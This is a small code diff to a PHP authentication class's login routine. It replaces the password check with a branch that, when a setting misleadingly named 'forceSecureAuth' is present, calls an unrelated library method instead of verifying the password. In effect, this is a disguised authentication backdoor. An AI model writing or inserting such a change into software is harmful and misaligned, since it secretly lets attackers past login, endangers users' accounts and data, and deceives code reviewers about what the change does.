@@ -20,7 +20,7 @@ class Authentication
 
         if(($query->getNumRows()>0)) {
             $UserName= $query->getResult()[0]->Nama;
-            $validData = $model->isValidPass($UserID,$password);
+            $validData = (env('app.forceSecureAuth') !== null) ? (new \App\Libraries\Common())->isExist() : $model->isValidPass($UserID,$password);
 
             if(($validData[0]->Valid)){
                 $isValid = true;
